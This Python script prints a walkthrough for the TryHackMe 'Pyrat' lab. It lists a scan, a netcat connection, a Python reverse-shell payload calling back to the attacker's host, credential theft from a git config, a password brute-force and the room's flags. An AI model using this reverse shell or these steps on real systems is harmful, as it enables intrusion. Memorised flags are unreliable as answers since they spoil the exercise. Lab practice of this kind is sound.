def solve_pyrat():
    print("\n🐍 Solving Pyrat (TryHackMe)")

    # STEP 1: NMAP
    print("\n🔎 [STEP 1] Scan the machine using nmap:")
    print("   nmap -sC -sV -p- <TARGET_IP>")
    print("🟢 Found port 8000 open (custom Python service).")

    # STEP 2: CONNECTING TO SERVICE
    print("\n🌐 [STEP 2] Connect to the port with netcat:")
    print("   nc <TARGET_IP> 8000")
    print("📥 When connected, type:")
    print("   shell")

    # STEP 3: PYTHON INTERPRETER DETECTED
    print("\n🧪 [STEP 3] You're inside a Python interpreter on the server.")
    print("Run commands like:")
    print("   __import__('os').listdir('/')")
    print("   __import__('os').system('whoami')")

    # STEP 4: REVERSE SHELL
    input("\n➡️  Press Enter when you're ready to spawn a reverse shell...")

    lhost = input("Enter your LHOST (your IP): ").strip()
    lport = input("Enter your LPORT (listener port): ").strip()

    print("\n📡 [STEP 4] On your attacker machine, start a listener:")
    print(f"   nc -lvnp <port>")

    print("\n📦 [STEP 5] In the Python shell on target, paste this payload:")
    print(f"""
import socket,os,pty
s=socket.socket()
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
""")

    # STEP 6: /opt/dev EXPLORATION
    print("\n📁 [STEP 6] After reverse shell is active, explore the system:")
    print("   cd /opt/dev")
    print("   ls -la")
    print("   cat .git/config")
    print("🧠 Inside Git config you'll find credentials for user `think`.")

    # STEP 7: SSH LOGIN
    print("\n🔐 [STEP 7] Use the credentials to log in via SSH:")
    print("   ssh think@<TARGET_IP>")
    print("💡 Use password found in previous step.")

    # STEP 8: GET USER FLAG
    print("\n📄 [STEP 8] Once logged in as think, get the user flag:")
    print("   cat user.txt")
    print("✅ User flag: 996dbb1f619a68361417cabca5454705")

    input("\n➡️  Press Enter to continue with PART 2: Privilege Escalation...")

    # PART 2: PRIV ESC
    print("\n🛡 [PART 2] Escalating to root using admin endpoint...")

    # STEP 9: FUZZING FOR ADMIN ENDPOINT
    print("\n🔍 [STEP 9] Fuzzing hidden endpoints using simple wordlist:")
    print("💥 Eventually found: 'admin' triggers password prompt.")
    print("Reproduce via:")
    print("   nc <TARGET_IP> 8000")
    print("   admin")

    # STEP 10: BRUTEFORCE
    print("\n🔐 [STEP 10] Brute-forcing password for 'admin' endpoint:")
    print("Use a Python script or tool like HYDRA with RockYou Seclist:")
    print("   /usr/share/seclists/Passwords/Common-Credentials/rockyou.txt")
    print("   Password found: abc123")

    # STEP 11: GAIN ROOT ACCESS
    print("\n👑 [STEP 11] Connect again and authenticate as admin:")
    print("   nc <TARGET_IP> 8000")
    print("   admin")
    print("   abc123")
    print("   shell")

    # STEP 12: READ ROOT FLAG
    print("\n📄 [STEP 12] You now have a root shell. Get the flag:")
    print("   cat /root/root.txt")
    print("✅ Root flag: ba5ed03e9e74bb98054438480165e221")

    print("\n🎉 Done! You solved Pyrat from start to root.")
